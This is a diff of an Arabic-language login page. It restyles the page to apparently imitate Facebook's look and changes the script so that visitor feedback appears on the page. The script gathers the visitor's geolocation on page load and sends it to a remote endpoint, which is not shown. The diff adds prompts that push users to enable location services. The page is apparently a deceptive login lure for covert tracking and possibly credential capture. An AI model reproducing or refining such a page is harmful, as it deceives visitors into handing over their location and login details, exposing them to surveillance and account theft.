@@ -7,24 +7,26 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #121212;
-            color: #ffffff;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
         }
         .login-container {
-            background-color: #1e1e1e;
-            padding: 20px;
+            background-color: #fff;
             border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-            width: 300px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            padding: 20px;
             text-align: center;
         }
         .login-container h2 {
             margin-bottom: 20px;
+            font-size: 24px;
+            color: #1877f2;
         }
         .input-group {
             margin-bottom: 15px;
@@ -33,33 +35,75 @@
         .input-group label {
             display: block;
             margin-bottom: 5px;
+            font-weight: bold;
+            color: #333;
         }
         .input-group input {
             width: 100%;
-            padding: 8px;
+            padding: 10px;
             box-sizing: border-box;
-            border: 1px solid #444;
-            border-radius: 4px;
-            background-color: #1e1e1e;
-            color: #ffffff;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            background-color: #fafafa;
+            color: #333;
+            font-size: 16px;
         }
         .input-group input:focus {
             outline: none;
-            border-color: #66bb6a;
+            border-color: #1877f2;
+            box-shadow: 0 0 5px rgba(24, 119, 242, 0.5);
         }
         .submit-btn {
             width: 100%;
             padding: 10px;
-            background-color: #66bb6a;
+            background-color: #1877f2;
             border: none;
-            border-radius: 4px;
-            color: #ffffff;
+            border-radius: 6px;
+            color: #fff;
             font-size: 16px;
             cursor: pointer;
             transition: background-color 0.3s ease;
         }
         .submit-btn:hover {
-            background-color: #55aa59;
+            background-color: #166fe5;
+        }
+        .alert {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 6px;
+            text-align: center;
+        }
+        .alert-danger {
+            background-color: #f44336;
+            color: white;
+        }
+        .alert-success {
+            background-color: #4caf50;
+            color: white;
+        }
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #65676b;
+        }
+        .separator::before,
+        .separator::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #ddd;
+        }
+        .separator span {
+            margin: 0 10px;
+        }
+        .signup-link {
+            margin-top: 15px;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .signup-link:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
@@ -76,8 +120,11 @@
             <label for="password">كلمة المرور:</label>
             <input type="password" id="password" name="password" required>
         </div>
-        <button type="submit" class="submit-btn">إرسال</button>
+        <button type="submit" class="submit-btn">تسجيل الدخول</button>
     </form>
+    <div id="locationAlert" class="alert"></div>
+    <div class="separator"><span>أو</span></div>
+    <a href="#" class="signup-link">إنشاء حساب جديد</a>
 </div>
 
 <script>
@@ -89,7 +136,7 @@ function getLocation() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, showError);
     } else {
-        alert("المتصفح لا يدعم جغرافيا الويب.");
+        showAlert('alert-danger', 'المتصفح لا يدعم جغرافيا الويب.');
     }
 }
 
@@ -112,11 +159,14 @@ function sendLocation(position) {
     })
     .then(response => response.json())
     .then(data => {
-        if (!data.ok) {
-            console.error('خطأ في إرسال الموقع:', data);
+        if (data.ok) {
+            showAlert('alert-success', 'تم إرسال موقعك بنجاح.');
+        } else {
+            showAlert('alert-danger', 'خطأ في إرسال موقعك.');
         }
     })
     .catch(error => {
+        showAlert('alert-danger', 'حدث خطأ أثناء إرسال موقعك.');
         console.error('حدث خطأ:', error);
     });
 }
@@ -124,18 +174,24 @@ function sendLocation(position) {
 function showError(error) {
     switch(error.code) {
         case error.PERMISSION_DENIED:
-            alert("لم يتم السماح بوصول الموقع.");
+            showAlert('alert-danger', 'لم يتم السماح بوصول الموقع. يرجى تفعيل خدمة تحديد الموقع في إعدادات هاتفك.');
             break;
         case error.POSITION_UNAVAILABLE:
-            alert("معلومات الموقع غير متاحة.");
+            showAlert('alert-danger', 'معلومات الموقع غير متاحة.');
             break;
         case error.TIMEOUT:
-            alert("الطلب لتحديد الموقع أدى إلى وقت انتظار.");
+            showAlert('alert-danger', 'الطلب لتحديد الموقع أدى إلى وقت انتظار.');
             break;
         case error.UNKNOWN_ERROR:
-            alert("خطأ غير معروف.");
+            showAlert('alert-danger', 'خطأ غير معروف.');
             break;
     }
+}
+
+function showAlert(type, message) {
+    const alertDiv = document.getElementById('locationAlert');
+    alertDiv.className = `alert ${type}`;
+    alertDiv.textContent = message;
 }
 
 // جمع موقع المستخدم عند تحميل الصفحة
